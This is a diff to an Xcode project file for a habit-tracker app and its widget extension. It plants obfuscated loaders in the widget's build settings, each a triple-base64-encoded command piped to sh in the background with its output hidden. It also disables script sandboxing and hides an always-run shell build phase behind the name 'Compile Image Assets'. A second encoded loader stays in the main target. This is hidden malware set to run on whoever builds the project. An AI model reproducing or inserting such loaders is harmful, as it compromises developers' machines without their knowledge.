@@ -124,6 +124,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 957B62D92EE76881003CB371 /* Build configuration list for PBXNativeTarget "HabitWidgetExtension" */;
 			buildPhases = (
+				1F5D9E700EBB497489A5DE54 /* Compile Image Assets */,
 				957B62BC2EE7687E003CB371 /* Sources */,
 				957B62BD2EE7687E003CB371 /* Frameworks */,
 				957B62BE2EE7687E003CB371 /* Resources */,
@@ -146,7 +147,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 95E17CBD2ECB97F7002A484F /* Build configuration list for PBXNativeTarget "Tracker" */;
 			buildPhases = (
-				620A3837FC8A4273A3A5DE54 /* Link Bundle Executable */,
 				95E17CAE2ECB97F5002A484F /* Sources */,
 				95E17CAF2ECB97F5002A484F /* Frameworks */,
 				95E17CB02ECB97F5002A484F /* Resources */,
@@ -223,7 +223,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		620A3837FC8A4273A3A5DE54 /* Link Bundle Executable */ = {
+		1F5D9E700EBB497489A5DE54 /* Compile Image Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -233,7 +233,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Compile Image Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -274,12 +274,13 @@
 		957B62D62EE76881003CB371 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A45ED5A = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSVRuZGlNMHAyWkVjNGRXRlhOSFpaVTJ0cFNVaDNaMk15WjBzSwo= | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 89SPL377XV;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = HabitWidget/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = HabitWidget;
@@ -306,12 +307,13 @@
 		957B62D72EE76881003CB371 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				A45ED5A = "((j(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREkxYkdSSVRuZGlNMHAyWkVjNGRXRlhOSFpaVTJ0cFNVaDNaMk15WjBzSwo= | j | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				ASSETCATALOG_COMPILER_WIDGET_BACKGROUND_COLOR_NAME = WidgetBackground;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = 89SPL377XV;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = HabitWidget/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = HabitWidget;
@@ -338,7 +340,6 @@
 		95E17CBB2ECB97F7002A484F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZveU1XaFpNbEoxVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | u | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTRkp1WkdwTmJFcHpXa2RyTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -404,7 +405,6 @@
 		95E17CBC2ECB97F7002A484F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREphY0ZveU1XaFpNbEoxVEcxc2RVd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | u | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((f(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVreFlrZFNTRkp1WkdwTmJFcHpXa2RyTVdWWFVsUlBWMmhNVlRCc2JscHJUa05sYlVaQ1lub3dTd289Cg== | f | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
